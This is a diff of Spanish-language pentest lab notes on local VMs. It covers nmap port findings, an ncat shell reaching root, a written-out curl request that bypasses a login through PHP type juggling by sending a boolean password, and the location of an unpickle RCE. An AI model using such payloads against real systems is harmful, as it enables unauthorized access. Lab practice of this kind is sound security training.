@@ -18,64 +18,21 @@ app1(o 3, no recuerda) hay 2 fallos:
 cree: ssti -> app3, rce unpiclke -> app 1
 
 # NMAP 
+## TCP
 Puertos abiertos:
-```
-21/tcp   open  ftp
-22/tcp   open  ssh
-80/tcp   open  http
-3306/tcp open  mysql
-5555/tcp open  freeciv
-9001/tcp open  tor-orport
-```  
+![[Pasted image 20251203104441.png]]
 
-información importante sobre los 
-```
-PORT      STATE  SERVICE VERSION
-21/tcp    open   ftp     vsftpd (broken: both local and anonymous access disabled!)
-
-se necesita usuario ya que el acceso anónimo está deshabilitado 
-
-22/tcp    open   ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   256 a1:a0:86:5d:7c:7f:4e:f4:ab:ca:90:0d:49:89:e4:7c (ECDSA)
-|_  256 30:c4:82:38:86:3e:08:3e:87:5c:a8:08:f6:8d:fe:e1 (ED25519)
-
-tenemos la ssh key pero ssh es bastante jodido de crackear, revisar exploit con la versión
-  
-80/tcp    open   http    Apache httpd 2.4.58 ((Ubuntu))
-|_http-server-header: Apache/2.4.58 (Ubuntu)
-
-página web
-
-3306/tcp  open   mysql   MariaDB 10.3.23 or earlier (unauthorized)
-base de datos con inicio de sesión
-
-9001/tcp  open   http    SimpleHTTPServer 0.6 (Python 3.13.0)
-|_http-server-header: SimpleHTTP/0.6 Python/3.13.0
-|_http-title: Directory listing for /
-
-pagina web 2
-
-55555/tcp closed unknown
-no info revisar puerto
-```
-
-udp
-```
-  alee   ~  sudo nmap -sU 192.168.207.130
-Deploying root access for alee. Password pls:
-Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-02 09:13 +0100
-Nmap scan report for app1.unie (192.168.207.130)
-Host is up (0.0011s latency).
-Not shown: 999 closed udp ports (port-unreach)
-PORT     STATE         SERVICE
-5353/udp open|filtered zeroconf
-MAC Address: 00:0C:29:12:78:D3 (VMware)
-
-Nmap done: 1 IP address (1 host up) scanned in 1009.02 seconds
-  alee   ~ 
-```
-
+información más detallada sobre los puertos
+![[Pasted image 20251203104625.png]]
+Exploración:
+**21/tcp (ftp):** Se necesita usuario ya que el acceso anónimo está deshabilitado 
+**22/tcp (ssh):** revisar exploit con la versión
+**80/tcp:** Apache
+**3306/tcp (mysql)**: base de datos con inicio de sesión
+**9001/tcp:** puerto python
+**55555/tcp closed unknown:** no info revisar puerto
+## UDP
+![[Pasted image 20251203110814.png]]
 # Puertos
 ## 9001
 al entrar a http://192.168.207.130:9001/ podemos ver los directorios y vemos que tenemos para descargar sin uniciar sesión los siguientes archivos
@@ -280,13 +237,23 @@ con esto en la terminal donde ponemos ncat nos llega
 ![[Pasted image 20251203094003.png]]
 donde vemos que tenemos permiso de root y estamos efectivamente dentro de la maquina
 
+# PHP type juggling
+Primero reviso el código de la parte del login para saber como tengo que rellenarlo
+![[Pasted image 20251203100647.png]]
+Primero revisamos la respuesta cuando ponemos un mail y contraseña correctos
+![[Pasted image 20251203100938.png]]
+y vemos que poniendo
+```bash
+curl -X POST http://app2.unie/v2/users/login -H "Content-Type: application/json" -d '{"email":"admin@app2.unie","password":true}'
+```
+nos devuelve lo correcto por lo que confirmamos que hay **PHP type juggling**
+![[Pasted image 20251203101135.png]]
+(todo esto se puede hacer con la peticion de login encontrada en http://app2.unie/docs/ utilizando burpsuite)
 
-
-
-
-
-
-
+# RCE Unpickle
+El codigo relacionado con esto se encuentrea en /var/www/html/app1/users/views.py , exactamente en la linea 84 de la clase profileview
+![[Pasted image 20251203102909.png]]
+ahora que confirmamos que está lo explotamos
 
 
 
